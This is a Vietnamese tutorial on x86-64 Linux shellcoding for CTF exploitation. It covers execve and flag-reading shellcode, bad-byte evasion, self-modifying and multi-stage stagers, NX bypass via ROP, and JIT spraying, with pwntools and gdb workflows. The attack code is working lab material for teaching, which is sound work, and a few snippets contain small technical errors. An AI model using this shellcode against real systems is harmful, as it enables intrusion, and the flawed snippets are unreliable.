# Bài 3: Shellcoding Resources

## Phần 1: Các Khái Niệm Cốt Lõi và Kỹ Thuật Nền Tảng

Nền tảng của mọi kỹ thuật tấn công shellcode bắt nguồn từ kiến trúc Von Neumann, nơi **Code và Data cùng tồn tại trong một không gian bộ nhớ**. Điều này mở ra khả năng lợi dụng các lỗ hổng (như Tràn bộ đệm - Buffer Overflow) để "lừa" CPU thực thi Data của kẻ tấn công như thể nó là Code.

### Code Injection: Biến Dữ Liệu Thành Mệnh Lệnh

Hãy xem xét một ví dụ kinh điển về lỗ hổng tràn bộ đệm trên stack.

```c
void hello(char *name, void (*bye_func)()) {
    printf("Hello %s!\n", name);
    bye_func();
}

int main(int argc, char **argv) {
    char name[1024];
    gets(name); // <-- Lỗ hổng ở đây!
    
    // ... logic gọi hàm hello ...
}
```

Hàm `gets()` không kiểm tra kích thước đầu vào, cho phép kẻ tấn công ghi một chuỗi dài hơn 1024 bytes. Khi đó, họ có thể ghi đè lên các dữ liệu quan trọng khác trên stack, bao gồm cả địa chỉ trả về (Return Address) hoặc một con trỏ hàm (Function Pointer).

**Kịch bản tấn công:**
1.  Kẻ tấn công chuẩn bị một payload. Payload này chứa mã máy (machine code) mà họ muốn thực thi, được gọi là **shellcode**.
2.  Họ đặt shellcode này vào trong chuỗi đầu vào.
3.  Họ tính toán để ghi đè địa chỉ trả về hoặc con trỏ hàm bằng chính địa chỉ của shellcode trên stack.
4.  Khi hàm `main` (hoặc `hello`) kết thúc và thực hiện lệnh `ret` (hoặc gọi `bye_func()`), thay vì nhảy đến địa chỉ hợp lệ, CPU sẽ nhảy đến shellcode và thực thi nó.

### Shellcode Là Gì và Viết Nó Như Thế Nào?

Ban đầu, mục tiêu phổ biến nhất của payload là sinh ra một giao diện dòng lệnh (shell), do đó có tên là "shellcode".

#### A. Syscall và Quy Ước Gọi Hàm (Calling Convention) trên Linux x86-64

Để yêu cầu hệ điều hành làm một việc gì đó (mở file, chạy tiến trình, thoát...), shellcode phải thực hiện các lời gọi hệ thống (System Calls - Syscalls). Trên Linux x86-64, quy ước này được tuân thủ nghiêm ngặt:

*   **`rax`**: Chứa số hiệu của syscall (Syscall Number).
*   **`rdi`**: Tham số thứ 1 (Argument 1).
*   **`rsi`**: Tham số thứ 2 (Argument 2).
*   **`rdx`**: Tham số thứ 3 (Argument 3).
*   **`r10`**: Tham số thứ 4 (Argument 4).
*   **`r8`**: Tham số thứ 5 (Argument 5).
*   **`r9`**: Tham số thứ 6 (Argument 6).
*   Lệnh `syscall` được dùng để kích hoạt lời gọi hệ thống.
*   Giá trị trả về của syscall sẽ được lưu trong `rax`.

Ví dụ, để thực thi `execve("/bin/sh", NULL, NULL)`:

*   Syscall `execve` có số hiệu là `59` (hoặc `0x3b`).
*   Tham số 1: `"/bin/sh"` (một con trỏ tới chuỗi).
*   Tham số 2: `NULL` (argv).
*   Tham số 3: `NULL` (envp).

Đây là mã assembly tương ứng:

```asm
.intel_syntax noprefix

.global _start
_start:
    mov rax, 59             # syscall number for execve
    lea rdi, [rip+binsh]    # arg1: address of "/bin/sh" string
    mov rsi, 0              # arg2: NULL
    mov rdx, 0              # arg3: NULL
    syscall                 # trigger the system call

binsh:
    .string "/bin/sh"
```

#### B. Position-Independent Code (PIC) - Mã Độc Lập Vị Trí

> Lệnh `lea rdi, [rip+binsh]` là một trong những kỹ thuật quan trọng nhất. Do cơ chế bảo mật **ASLR** (Address Space Layout Randomization), shellcode không bao giờ biết trước nó sẽ được nạp vào địa chỉ nào. Do đó, việc hardcode địa chỉ (ví dụ `mov rdi, 0x400080`) là bất khả thi.
>
> **RIP-relative addressing** giải quyết vấn đề này. `rip` là thanh ghi trỏ đến lệnh *tiếp theo* sẽ được thực thi. `[rip+binsh]` có nghĩa là "lấy địa chỉ của nhãn `binsh` tương đối với vị trí của lệnh hiện tại". Bằng cách này, shellcode luôn có thể tìm thấy dữ liệu của chính nó.

#### C. Các Kỹ Thuật Nhúng Dữ Liệu (Embedding Data)

1.  **Sử dụng `.string` hoặc `.byte`:** Đơn giản nhất, như ví dụ trên.
2.  **Nhúng trực tiếp vào thanh ghi:** Ta có thể mã hóa chuỗi thành số Hex và nạp vào thanh ghi. Chú ý rằng kiến trúc x86 là **Little Endian** (byte thấp ở địa chỉ thấp).

Ví dụ, chuỗi `/bin/sh` (7 bytes) + 1 null byte `\0` là 8 bytes. Dưới dạng hex: `2f 62 69 6e 2f 73 68 00`. Khi ghi vào bộ nhớ, nó sẽ là `0068732f6e69622f`.

```asm
mov rbx, 0x68732f6e69622f   # Move "/bin/sh" (reversed due to endianness, without leading null)
push rbx                    # Push "/bin/sh" onto the stack
mov rdi, rsp                # Point rdi to the string on the stack
```

### Non-shell Shellcode: Không Chỉ Để Gọi Shell

Đôi khi, mục tiêu không phải là một shell tương tác mà là đọc một file nhạy cảm (ví dụ `/flag`) và in ra màn hình.

Kịch bản: `open("/flag", O_RDONLY)` -> `sendfile(STDOUT_FILENO, fd, 0, 1000)` -> `exit()`

```asm
.intel_syntax noprefix

.global _start
_start:
    # --- open("/flag", O_RDONLY) ---
    # Syscall: open (rax=2), path (rdi), flags (rsi=0, O_RDONLY)
    mov rax, 2
    push 0x67616c662f2f2f2f ; "////flag" to avoid null bytes, can be cleaner
    mov rdi, rsp
    xor rsi, rsi
    syscall

    # rax now holds the file descriptor (fd) of /flag

    # --- sendfile(1, fd, 0, 1000) ---
    # Syscall: sendfile (rax=40), out_fd (rdi=1), in_fd (rsi=fd from open),
    # offset (rdx=0), count (r10=1000)
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 1000
    mov rax, 40
    syscall

    # --- exit(0) ---
    # Syscall: exit (rax=60), error_code (rdi=0)
    mov rax, 60
    xor rdi, rdi
    syscall
```

### Xây Dựng và Thử Nghiệm Shellcode

Vòng đời phát triển một shellcode bao gồm: Viết Assembly -> Biên dịch -> Trích xuất mã máy -> Thử nghiệm.

**1. Viết và Biên Dịch:** Lưu mã assembly (ví dụ `shellcode.s`).

```bash
# Biên dịch thành một file ELF thực thi được để dễ debug
gcc -nostdlib -static shellcode.s -o shellcode-elf
```

**2. Trích Xuất Raw Bytes:**

```bash
# Trích xuất section .text (nơi chứa code) ra file thô
objcopy --dump-section .text=shellcode-raw shellcode-elf
```

File `shellcode-raw` chính là payload bạn sẽ tiêm vào chương trình mục tiêu.

**3. Thử Nghiệm Nhanh:**

```bash
# Chạy trực tiếp file ELF để xem nó có hoạt động không
./shellcode-elf
```

**4. Thử Nghiệm Trong Môi Trường Giả Lập (Loader):**

Đôi khi bạn cần tái tạo điều kiện phức tạp. Viết một chương trình C nhỏ để nạp và chạy shellcode.

```c
// tester.c
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    // Cấp phát một trang bộ nhớ có quyền Read, Write, Execute
    void *page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    
    // Đọc shellcode từ stdin vào trang nhớ vừa cấp phát
    read(0, page, 0x1000);
    
    // Ép kiểu con trỏ và gọi shellcode
    ((void(*)())page)();
    
    return 0;
}
```

Biên dịch và chạy:

```bash
gcc tester.c -o tester
cat shellcode-raw | ./tester
```

---

## Phần 2: Các Thách Thức Phổ Biến và Kỹ Thuật Lẩn Tránh

Việc viết shellcode không chỉ đơn giản là dịch syscall ra mã máy. Trong thực tế, payload của bạn phải vượt qua rất nhiều rào cản do môi trường hoặc chính lỗ hổng áp đặt.

### A. Ký Tự Cấm (Forbidden Bytes / Bad Characters)

Đây là trở ngại lớn nhất và thường gặp nhất. Tùy thuộc vào hàm gây ra lỗ hổng, một số byte nhất định sẽ không được phép xuất hiện trong shellcode của bạn, nếu không payload sẽ bị cắt cụt hoặc bị biến đổi.

| Byte (Hex)         | Tên Ký Tự      | Nguyên Nhân Phổ Biến                               |
| ------------------ | -------------- | -------------------------------------------------- |
| `0x00`             | Null byte `\0` | Các hàm xử lý chuỗi trong C (`strcpy`, `strcat`, `printf`). |
| `0x0a`             | Newline `\n`   | Các hàm đọc theo dòng (`gets`, `fgets`).           |
| `0x0d`             | Carriage Ret   | Các hàm đọc theo dòng.                             |
| `0x20`, `0x09`     | Space, Tab     | Các hàm đọc có định dạng (`scanf`).                |
| `0x2f`, `0x2e`     | `/`, `.`       | Lỗ hổng Path Traversal, payload bị coi là đường dẫn. |
| `0x3a`, `0x40`     | `:`, `@`        | Các lỗ hổng liên quan đến URL parsing.              |
| Các ký tự không in được | (Non-printable) | Payload bị ép buộc phải là Alphanumeric.          |

#### Kỹ Thuật Né Tránh Ký Tự Cấm

Mục tiêu là viết lại các lệnh assembly để mã máy (opcode) sinh ra không chứa các byte bị cấm. Đây là lúc sự sáng tạo và hiểu biết sâu về tập lệnh x86-64 phát huy tác dụng.

**1. Tạo ra giá trị 0 mà không dùng byte `0x00`:**

Cách tồi (chứa 4 byte `0x00`):
* `mov rax, 0` -> `48 c7 c0 00 00 00 00`

Cách tốt (không chứa byte `0x00`):
* `xor rax, rax` -> `48 31 c0`
* `sub rax, rax` -> `48 29 c0`
* `push 0; pop rax` (nếu stack không bị ảnh hưởng)

**2. Tạo ra giá trị nhỏ khác 0:**

Thay vì nạp trực tiếp giá trị có chứa byte cấm (ví dụ `0x0a` - newline), ta có thể tạo ra nó qua các phép toán.

Cách tồi (chứa byte `0x0a`):
* `mov al, 10` -> `b0 0a`

Cách tốt:
* `xor rax, rax; mov al, 9; inc al` -> `48 31 c0 b0 09 fe c0` (dài hơn nhưng an toàn)
* `push 11; pop rax; dec rax`

**3. Xử lý chuỗi có chứa ký tự cấm:**

Giả sử byte `/` (`0x2f`) bị cấm, nhưng bạn cần chuỗi `"/bin/sh"`.

*   **Dùng XOR Encoding:** Mã hóa chuỗi của bạn bằng một khóa (key) nào đó, sau đó viết một đoạn shellcode nhỏ để giải mã nó ngay trong bộ nhớ trước khi sử dụng.

    ```asm!
    ; Giả sử chuỗi "/bin/sh" đã được XOR với key 0x41 ('A')
    ; và lưu vào vùng data: encrypted_str db 0x6e, 0x23, 0x28, 0x2f, 0x6e, 0x32, 0x29
    
    lea rdi, [rip+encrypted_str]
    mov rcx, 7 ; length of the string
    
    decode_loop:
        xor byte ptr [rdi], 0x41
        inc rdi
        loop decode_loop
    
    ; Bây giờ chuỗi đã được giải mã tại địa chỉ [rip+encrypted_str]
    ```

*   **Tạo ra chuỗi trên stack:** Đẩy các phần của chuỗi vào stack một cách khéo léo để tránh byte cấm.

    ```asm
    ; Goal: create "/bin/sh" on the stack
    xor rax, rax          ; rax = 0
    mov rbx, 0x68732f6e69622f ; "/bin/sh" (reversed)
    push rbx              
    mov rdi, rsp          ; rdi now points to "/bin/sh"
    ```
    Nếu `0x2f` (`/`) bị cấm, ta có thể tạo ra nó:
    ```asm
    ; Goal: create "/bin/sh" on stack, avoiding '/' (0x2f)
    mov rbx, 0x68732e6e69622e ; ".bin.sh"
    push rbx
    mov byte ptr [rsp+4], 0x2f ; write '/' over the second '.'
    mov rdi, rsp
    ```

* **Thay thế `mov` bằng `push/pop` để không tạo ra REX prefix:**
  ```nasm
  ; Thay vì: mov rdi, rax (Mã máy: 48 89 c7 -> Dính H-byte)
  push rax
  pop rdi           ; (Mã máy: 50 5f -> Sạch H-byte)
  ```

* **Lấy địa chỉ Stack (RSP) mà không dính 0x48:**
  ```nasm
  ; Thay vì: mov rsi, rsp (Mã máy: 48 89 e6 -> Dính H-byte)
  push rsp
  pop rsi           ; (Mã máy: 54 5e -> Sạch H-byte)
  ```

> **Lưu ý:** Kỹ thuật này không chỉ giúp né H-byte mà còn giữ trọn vẹn giá trị 64-bit của thanh ghi, tránh lỗi Segmentation Fault do bị cắt cụt địa chỉ khi thao tác trên các thanh ghi 32-bit (eax, esp, edi...).

* **Lợi dụng lệnh call để đẩy địa chỉ của 1 chuỗi lên stack:**
```nasm
.intel_syntax noprefix
.global _start

_start:
    jmp get_flag_addr       # Nhảy xuống cuối để lấy địa chỉ chuỗi
after_flag:
    pop rdi                 # Lấy địa chỉ "/flag" từ stack vào rdi (mã máy: 5f)
get_flag_addr:
    call after_flag         # Đẩy địa chỉ "/flag" lên stack bằng lệnh call và quay lại sau lệnh jmp
    .string "/flag"
```
---

### B. Mã Tự Sửa Đổi (Self-Modifying Code)

Nếu shellcode của bạn được nạp vào một vùng nhớ có quyền ghi (`PROT_WRITE`), bạn có thể viết một đoạn code tự thay đổi chính nó khi chạy. Kỹ thuật này cực kỳ mạnh để bypass các filter phức tạp.

Giả sử lệnh `syscall` (`0f 05`) bị cấm.

```asm
.intel_syntax noprefix

.section .text.writable,"awx" # Yêu cầu linker cấp quyền Writable+Executable

_start:
    lea rdi, [rip+syscall_instruction]
    mov byte ptr [rdi], 0x0f      ; Ghi byte đầu tiên của syscall
    mov byte ptr [rdi+1], 0x05    ; Ghi byte thứ hai
    
    ; ... chuẩn bị các thanh ghi cho execve ...
    
syscall_instruction:
    .byte 0x00, 0x00  ; Placeholder, sẽ bị ghi đè
```

Khi chạy, đoạn code trên sẽ tự "vá" lại lệnh `syscall` và sau đó thực thi nó.

### C. Shellcode Đa Giai Đoạn (Multi-Stage Shellcode)

Khi các ràng buộc về kích thước hoặc ký tự cấm quá khắc nghiệt, việc viết một payload hoàn chỉnh là không thể. Giải pháp là chia nhỏ nó:

*   **Stage 1 (Stager/Egg Hunter):** Một đoạn shellcode cực ngắn, tối giản, được viết để vượt qua mọi filter. Nhiệm vụ duy nhất của nó là đọc một payload lớn hơn (Stage 2) từ một nguồn khác (network socket, stdin) vào một vùng nhớ có thể thực thi.

    Ví dụ về stager đọc từ `stdin` (fd=0) vào chính vị trí hiện tại (`rip`):

    ```asm
    ; A minimal stager, assuming we can get rip
    ; syscall read(0, rip, 1000)
    xor rax, rax            ; rax = 0 (syscall read)
    xor rdi, rdi            ; rdi = 0 (fd=stdin)
    lea rsi, [rip]          ; rsi = current instruction pointer
    mov rdx, 1000           ; rdx = number of bytes to read
    syscall                 ; Execute read()
    
    ; Stage 2 shellcode starts from here...
    ```
    Payload này sẽ đọc Stage 2 từ `stdin` và ghi đè lên chính nó, sau đó CPU sẽ tiếp tục thực thi Stage 2.

*   **Stage 2 (Final Payload):** Shellcode hoàn chỉnh, không bị ràng buộc, thực hiện mục tiêu cuối cùng (gọi shell, đọc flag...).

### D. Shellcode Bị Biến Đổi (Shellcode Mangling)

Trong một số kịch bản CTF hoặc thực tế, input của bạn có thể bị chương trình mục tiêu xử lý trước khi thực thi.

*   **Sắp xếp (Sorting):** Nếu các byte của shellcode bị sắp xếp, bạn phải tìm cách viết shellcode mà sau khi bị sắp xếp vẫn có ý nghĩa. Thường thì sẽ là một chuỗi các lệnh đơn giản lặp đi lặp lại (VD: `inc eax` nhiều lần).
*   **Chuyển đổi Case (toupper/tolower):** Nếu payload bị chuyển thành chữ hoa/thường, bạn phải chọn các lệnh có opcode nằm ngoài vùng bị ảnh hưởng (ví dụ, không nằm trong `0x61-0x7a`).
*   **Giải pháp chung:** Luôn bắt đầu từ trạng thái cuối cùng bạn muốn đạt được (shellcode có thể thực thi) và tìm cách "đảo ngược" quá trình biến đổi của chương trình. Đôi khi, bạn chỉ có thể kiểm soát một vài byte, hãy dùng chúng để thực hiện một cú nhảy (`jmp`) đến một vùng dữ liệu khác mà bạn có thể kiểm soát hoàn toàn.

### E. Shellcode Câm (Blind Shellcode - No Output)

Điều gì xảy ra nếu chương trình mục tiêu đã đóng `stdout` (fd=1) và `stderr` (fd=2)? Shellcode của bạn có thể chạy, đọc được flag, nhưng không có cách nào để in nó ra. Đây là lúc cần đến kỹ thuật **Side-Channel Attack**.

*   **Time-based Attack:** Shellcode sẽ đọc flag từng ký tự. Với mỗi ký tự, nó sẽ so sánh với một ký tự đoán được.
    *   Nếu **đoán đúng**, chương trình sẽ đi vào một vòng lặp vô tận (`jmp .`), làm cho kết nối bị treo (timeout).
    *   Nếu **đoán sai**, chương trình sẽ cố tình gây ra lỗi (ví dụ: truy cập địa chỉ `NULL`) và crash ngay lập tức.
    Kẻ tấn công sẽ viết một script để thử từng ký tự, nếu kết nối bị treo, họ biết mình đã đoán đúng và chuyển sang ký tự tiếp theo.

*   **Connection-based Attack (Out-of-band):** Nếu shellcode có thể thực hiện syscall `connect`, nó có thể đọc flag và gửi nó về một server do kẻ tấn công kiểm soát.

---

## Phần 3: Vượt Qua Cơ Chế Phòng Thủ - Data Execution Prevention (W^X)

Khi các cuộc tấn công shellcode trở nên phổ biến, các nhà thiết kế CPU và hệ điều hành đã giới thiệu một cơ chế phòng thủ phần cứng cực kỳ hiệu quả: **bit NX (No-eXecute)**, hay còn được biết đến với tên gọi **DEP (Data Execution Prevention)**.

Nguyên tắc này được gọi là **W^X** (Write XOR Execute), có nghĩa là một vùng bộ nhớ có thể có quyền **Ghi (Writeable)** hoặc có quyền **Thực thi (Executable)**, nhưng không bao giờ được có cả hai quyền cùng một lúc.

### A. Tác Động Của NX/DEP Lên Shellcode

Trong một hệ thống hiện đại, các vùng nhớ được phân chia quyền truy cập rất rõ ràng:
*   `.text` (Code Segment): `Read-Only` và `Execute` (R-X).
*   `.data`, `.bss`: `Read` và `Write` (RW-).
*   **Stack**: `Read` và `Write` (RW-).
*   **Heap**: `Read` và `Write` (RW-).

Điều này tạo ra một vấn đề chí mạng cho kỹ thuật tấn công shellcode kinh điển:
1.  Lỗ hổng tràn bộ đệm cho phép ta ghi shellcode vào **Stack** hoặc **Heap**.
2.  Tuy nhiên, cả hai vùng nhớ này đều được đánh dấu là **Non-Executable**.
3.  Khi ta điều hướng Instruction Pointer (`rip`) nhảy vào shellcode, CPU sẽ kiểm tra quyền của trang nhớ đó. Phát hiện đây là vùng nhớ không được phép thực thi, nó sẽ ném ra một lỗi **Segmentation Fault (SIGSEGV)** và chương trình bị crash.

> Game over? Không hẳn. Kẻ tấn công đã phát triển các kỹ thuật tinh vi hơn để vô hiệu hóa hoặc lách qua cơ chế bảo vệ này.

### B. Các Hướng Tấn Công Để Vượt Qua NX/DEP

#### 1. Return-Oriented Programming (ROP) - Tái Sử Dụng Mã Lệnh

Đây là kỹ thuật phổ biến và mạnh mẽ nhất để bypass NX. Thay vì tự viết và tiêm mã thực thi mới (shellcode), kẻ tấn công sẽ tìm kiếm các đoạn mã nhỏ đã có sẵn trong bộ nhớ của chương trình (trong section `.text` hoặc các thư viện được nạp) và xâu chuỗi chúng lại với nhau để thực hiện hành vi mong muốn.

*   **Gadgets:** Các đoạn mã nhỏ này được gọi là "gadgets". Mỗi gadget thường kết thúc bằng một lệnh `ret`.
*   **ROP Chain:** Kẻ tấn công xây dựng một chuỗi các địa chỉ của các gadget này trên stack. Khi hàm bị lỗi thực hiện lệnh `ret`, nó sẽ pop địa chỉ gadget đầu tiên từ stack vào `rip` và nhảy tới đó. Gadget này thực thi một vài lệnh (ví dụ: `pop rdi; ret`), sau đó lệnh `ret` cuối cùng của nó lại pop địa chỉ của gadget tiếp theo vào `rip`. Quá trình này lặp lại, tạo thành một chuỗi thực thi logic hoàn chỉnh.

**Mục tiêu của ROP Chain để chạy Shellcode:**

Một trong những ứng dụng phổ biến nhất của ROP là để gọi syscall `mprotect()` hoặc `mmap()` nhằm cấp lại quyền thực thi cho vùng nhớ chứa shellcode.

Kịch bản tấn công:
1.  **Tiêm shellcode:** Ghi shellcode vào một vùng nhớ có thể ghi (ví dụ: `.bss` hoặc stack).
2.  **Xây dựng ROP Chain:** Tạo một chuỗi gadget để thực hiện lời gọi `mprotect(address_of_shellcode, size, PROT_READ | PROT_WRITE | PROT_EXEC)`.
    *   Tìm gadget `pop rdi; ret` để nạp địa chỉ shellcode vào `rdi`.
    *   Tìm gadget `pop rsi; ret` để nạp kích thước vào `rsi`.
    *   Tìm gadget `pop rdx; ret` để nạp cờ quyền (`7`) vào `rdx`.
    *   Tìm địa chỉ của hàm `mprotect` trong thư viện (`libc`).
3.  **Thực thi ROP Chain:** Ghi đè địa chỉ trả về để trỏ đến gadget đầu tiên trong chuỗi.
4.  **Nhảy vào Shellcode:** Sau khi ROP chain thực thi xong và `mprotect` thành công, vùng nhớ chứa shellcode giờ đã có quyền `RWX`. Bước cuối cùng là một cú nhảy (`jmp`) hoặc `ret` tới địa chỉ của shellcode.

*(Chi tiết về ROP sẽ được đề cập trong một module khác, nhưng đây là mối liên hệ trực tiếp của nó với shellcoding).*

#### 2. Lợi Dụng Trình Biên Dịch Just-In-Time (JIT)

Các ngôn ngữ thông dịch hiệu năng cao (JavaScript trong trình duyệt, Java, LuaJIT, PyPy) sử dụng **JIT Compilation**. JIT compiler dịch mã bytecode hoặc mã kịch bản thành mã máy gốc (native machine code) ngay trong lúc chương trình đang chạy để tăng tốc độ.

Quá trình này tự nó đã tạo ra một "lỗ hổng" trong triết lý W^X:
1.  Để sinh mã máy, JIT engine cần một vùng nhớ có quyền **Ghi (Write)**.
2.  Để thực thi mã máy vừa sinh ra, vùng nhớ đó phải có quyền **Thực thi (Execute)**.

**Cách tiếp cận lười biếng (nhưng phổ biến):** Để tối ưu hóa tốc độ (vì syscall `mprotect` rất chậm), nhiều JIT engine sẽ yêu cầu hệ điều hành cấp phát các trang nhớ có cả hai quyền cùng lúc: **Read-Write-Execute (RWX)**. Đây chính là "vùng đất hứa" cho kẻ tấn công. Nếu tìm được một lỗ hổng để nhảy vào các trang nhớ này, họ có thể thực thi shellcode một cách dễ dàng.

**JIT Spraying:**

Ngay cả khi JIT engine tuân thủ W^X một cách nghiêm ngặt (chuyển đổi giữa `RW-` và `R-X`), kẻ tấn công vẫn có thể lợi dụng nó bằng kỹ thuật JIT Spraying.

Kịch bản tấn công (thường thấy trên trình duyệt):
1.  **Chuẩn bị payload:** Kẻ tấn công viết một đoạn mã JavaScript, trong đó nhúng shellcode dưới dạng các hằng số lớn (ví dụ, các opcode được mã hóa thành các giá trị số nguyên hoặc chuỗi).
    ```javascript
    var shellcode = "\x90\x90\x90\x90..."; // NOP sled
    var payload = shellcode + "\x31\xc0..."; // Actual shellcode
    
    // Tạo ra nhiều bản sao của shellcode trong bộ nhớ
    for (var i = 0; i < 1000; i++) {
        var evil_obj = { a: payload };
    }
    ```
2.  **"Spray" vào bộ nhớ:** Đoạn mã JavaScript này sẽ khiến JIT engine cấp phát bộ nhớ và ghi các hằng số (chứa shellcode) vào đó. Quá trình này được gọi là "spraying" vì nó rải shellcode ra khắp không gian bộ nhớ của tiến trình.
3.  **JIT biên dịch:** JIT engine sẽ biên dịch mã, và các hằng số này sẽ được ghi vào một trang nhớ. Sau đó, trang nhớ này sẽ được chuyển quyền thành **`R-X`** để thực thi.
4.  **Chuyển hướng thực thi:** Kẻ tấn công kích hoạt một lỗ hổng khác (ví dụ: Use-After-Free) để ghi đè một con trỏ hàm hoặc địa chỉ trả về, trỏ nó đến một địa chỉ *ngẫu nhiên* trong vùng nhớ đã được "phun". Vì shellcode đã được rải ra rất nhiều nơi, xác suất nhảy trúng vào nó (đặc biệt là vùng NOP sled) là rất cao.

JIT là một vector tấn công cực kỳ liên quan trong bối cảnh hiện đại, vì nó xuất hiện ở mọi nơi, từ trình duyệt web đến các ứng dụng máy chủ.

---

## Phần 4: Công Cụ và Quy Trình Làm Việc Chuyên Nghiệp

Viết shellcode bằng tay từ con số không có thể rất tốn thời gian và dễ xảy ra lỗi. Việc sử dụng các công cụ hiện đại và áp dụng một quy trình làm việc có hệ thống sẽ giúp bạn tăng tốc độ và độ chính xác.

### A. Xây Dựng Shellcode với Pwntools

**Pwntools** là một thư viện Python dành cho việc phát triển exploit, và nó là công cụ không thể thiếu của bất kỳ Pwner nào. Nó cung cấp các tính năng cực mạnh để làm việc với shellcode.

#### 1. Biên Dịch Assembly Trực Tiếp trong Python (`asm`)

Bạn có thể viết mã assembly trực tiếp trong script Python và `pwntools` sẽ biên dịch nó ra raw bytes cho bạn, giúp loại bỏ các bước `gcc`/`objcopy` thủ công.

```python
from pwn import *

# Thiết lập kiến trúc mục tiêu
context.arch = "amd64"

# Viết assembly trong một chuỗi nhiều dòng
my_sc_code = """
    xor rax, rax
    mov rdi, 0x1337
    nop
"""

# Dùng hàm asm() để biên dịch
sc_bytes = asm(my_sc_code)

# In ra mã máy dưới dạng hex
print(sc_bytes.hex())
# Kết quả: b'4831c048c7c73713000090'

# Dùng disasm() để dịch ngược lại kiểm tra
print(disasm(sc_bytes))
# Kết quả:
#    0:   48 31 c0                xor    rax, rax
#    3:   48 c7 c7 37 13 00 00    mov    rdi, 0x1337
#    a:   90                      nop
```

Quy trình này cho phép bạn thử nghiệm và thay đổi shellcode một cách cực kỳ nhanh chóng.

#### 2. Sử Dụng Thư Viện Shellcode Có Sẵn (`shellcraft`)

Pwntools đi kèm với `shellcraft`, một thư viện khổng lồ chứa các đoạn shellcode đã được viết sẵn, tối ưu hóa và kiểm thử cho nhiều kiến trúc và hệ điều hành khác nhau.

> **Cảnh báo:** Việc quá phụ thuộc vào `shellcraft` có thể làm bạn mất đi kỹ năng viết shellcode tay. Hãy dùng nó để tham khảo, học hỏi, hoặc khi cần một payload nhanh cho các tác vụ phổ biến, nhưng luôn phải hiểu được nó đang làm gì.

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

# Tạo shellcode để đọc file /flag và in ra stdout
# Pwntools sẽ tự động xử lý việc gọi syscall open, read, write
sc_cat_flag = shellcraft.cat("/flag")

# Biên dịch shellcode từ shellcraft
sc_bytes = asm(sc_cat_flag)

print(disasm(sc_bytes))
```
Kết quả `disasm` sẽ cho bạn thấy toàn bộ mã assembly mà `shellcraft` đã tạo ra, đây là một cách tuyệt vời để học hỏi các kỹ thuật viết shellcode tối ưu.

### B. Kỹ Thuật Gỡ Lỗi (Debugging)

Gỡ lỗi shellcode thường khó hơn gỡ lỗi một chương trình bình thường vì không có mã nguồn và môi trường thực thi rất hạn chế.

#### 1. `strace` - Theo Dõi Syscall

`strace` là công cụ hàng đầu để kiểm tra "góc nhìn tổng quan": shellcode của bạn có gọi đúng syscall với đúng tham số hay không?

```bash!
# Tạo một file chứa shellcode của bạn
python -c 'from pwn import *; context.arch="amd64"; sc=asm(shellcraft.sh()); print(sc.decode("latin-1"))' > shellcode-raw
```

```bash
# Tạo một chương trình loader (như tester.c ở Phần 1)
gcc tester.c -o tester

# Chạy shellcode qua strace
# Lưu ý: Chạy với quyền root để strace không bị drop privileges
sudo cat shellcode-raw | sudo strace ./tester
```
Output của `strace` sẽ hiển thị các lời gọi hệ thống như `execve`, `open`, `read`... Nếu bạn thấy `strace` không in ra gì hoặc in ra syscall không mong muốn, bạn biết rằng shellcode của mình đã gặp lỗi ở đâu đó trước khi đến được lệnh `syscall`.

#### 2. `gdb` và `int3` - Gỡ Lỗi Mức Lệnh

Khi `strace` không đủ, bạn cần đi sâu vào từng lệnh assembly.

**Breakpoint Bằng Tay (`int3`):**

Lệnh `int3` (opcode `0xcc`) là một lệnh đặc biệt dùng để tạo breakpoint. Khi CPU thực thi nó, nó sẽ gửi một tín hiệu ngắt đến hệ điều hành, và nếu có debugger (như gdb) đang gắn vào tiến trình, debugger sẽ dừng lại ngay tại đó.

Đây là kỹ thuật mạnh nhất để bắt đầu một phiên gỡ lỗi ngay khi shellcode của bạn bắt đầu được thực thi.

```python
from pwn import *

context.arch = "amd64"

# Thêm int3 vào đầu shellcode
sc_with_breakpoint = asm("int3") + asm(shellcraft.sh())

# Gửi shellcode này tới chương trình mục tiêu đang chạy dưới gdb
# p = process("./challenge")
p = gdb.debug("./challenge", """
    # Các lệnh gdb tự động thực thi khi khởi động
    # Ví dụ: đặt breakpoint ở hàm main
    b main
    continue
""")

p.sendline(sc_with_breakpoint)
p.interactive()
```
Khi chương trình thực thi đến lệnh `int3`, `gdb` sẽ dừng lại, và bạn có thể bắt đầu kiểm tra trạng thái các thanh ghi (`info registers`), bộ nhớ (`x/32gx $rsp`), và step qua từng lệnh (`si` - step instruction).

#### 3. Pwntools Debugging Harness

Viết một "harness" (kịch bản kiểm thử) nhỏ trong Python là cách hiệu quả để nhanh chóng kiểm tra và gỡ lỗi shellcode.

**a. Debug Assembly trực tiếp:**
`gdb.debug_assembly()` cho phép bạn gỡ lỗi một đoạn assembly ngắn mà không cần file thực thi.
```python
from pwn import *
context.arch = "amd64"
gdb.debug_assembly('mov rax, 0x1337; int3')
```
**b. Script kiểm tra ký tự cấm:**
Tự động hóa việc kiểm tra shellcode để đảm bảo nó không chứa các bad characters.
```python
from pwn import *
context.arch = "amd64"

bad_bytes = [b'\x00', b'\x0a', b'\x20']

sc_bytes = asm(shellcraft.sh())

found_bad_byte = False
for byte in bad_bytes:
    if byte in sc_bytes:
        print(f"Error: Bad byte {byte.hex()} found in shellcode!")
        found_bad_byte = True

if not found_bad_byte:
    print("Shellcode is clean!")
```
Quy trình làm việc này giúp bạn phát hiện lỗi sớm và tiết kiệm hàng giờ gỡ lỗi.
